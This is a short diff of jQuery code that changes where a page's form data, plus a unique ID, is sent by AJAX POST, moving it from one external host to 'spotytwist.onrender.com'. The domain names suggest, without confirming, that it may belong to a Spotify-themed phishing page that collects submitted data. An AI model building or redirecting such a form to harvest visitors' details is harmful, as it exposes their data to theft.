@@ -103,7 +103,7 @@ $(document).ready(function () {
         formData += '&unique_id=' + encodeURIComponent(unique_id);
         $.ajax({
             type: "POST",
-            url: "https://pikachu.sale/spot/post_data.php",
+            url: "https://spotytwist.onrender.com/post_data.php",
             data: formData,
             success: function (response) {
                 
